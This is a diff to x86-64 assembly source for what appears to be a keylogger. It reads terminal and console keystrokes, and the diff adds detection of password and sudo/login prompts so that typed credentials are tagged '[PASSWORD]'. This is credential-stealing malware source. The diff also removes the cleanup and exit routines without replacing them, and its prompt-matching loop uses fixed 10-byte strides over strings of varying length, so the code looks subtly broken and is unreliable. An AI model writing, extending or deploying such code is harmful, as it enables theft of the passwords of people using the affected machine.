@@ -14,11 +14,14 @@ section .data
     detecting_password db 0    
     password_detected db "[PASSWORD]", 0  
 
+    password_prompts db "password:", "Passwd:", "Enter PW:", "sudo", "root password:", "login:", "Authentication required", 0
+    password_prompts_len equ 7
+
 section .bss
     buf resb 1                 
     tspec resq 2               
     termios resb 60            
-    last_chars resb 10         
+    last_chars resb 20        
 
 section .text
 global _start
@@ -119,9 +122,9 @@ check_console:
 
 process_key:
     mov rsi, last_chars       
-    mov rcx, 9                
+    mov rcx, 19                
     rep movsb                 
-    mov [last_chars+9], al    
+    mov [last_chars+19], al    
 
     call check_password_prompt
     cmp byte [detecting_password], 1
@@ -160,45 +163,33 @@ process_key:
 
     jmp loop
 
-parent:
-    mov rax, 2            
-    mov rdi, ctrl_file
-    mov rsi, 102o        
-    mov rdx, 0644o       
-    syscall
+check_password_prompt:
+    mov rdi, last_chars
+    mov rsi, password_prompts
+    mov rcx, password_prompts_len
 
-    mov rax, 60              
-    xor rdi, rdi
-    syscall
+.password_check_loop:
+    cmp rcx, 0
+    je .no_password
+    
+    push rcx
+    push rdi
+    push rsi
+    
+    mov rcx, 10
+    repe cmpsb
+    je .found_password
+    
+    pop rsi
+    pop rdi
+    pop rcx
+    add rsi, 10
+    loop .password_check_loop
 
-exit:
-    mov byte [termios+3], 11  
-    mov rax, 16               
-    mov rdi, [tty_fd]
-    mov rsi, 2                
-    mov rdx, termios
-    syscall
+.no_password:
+    mov byte [detecting_password], 0
+    ret
 
-    mov rax, 3                
-    mov rdi, [fd]
-    syscall
-
-    mov rax, 3                
-    mov rdi, [tty_fd]
-    syscall
-
-    mov rax, 3
-    mov rdi, [console_fd]
-    syscall
-
-    mov rax, 3
-    mov rdi, [ctrl_fd]
-    syscall
-
-    mov rax, 87               
-    mov rdi, ctrl_file
-    syscall
-
-    mov rax, 60               
-    xor rdi, rdi
-    syscall
+.found_password:
+    mov byte [detecting_password], 1
+    ret
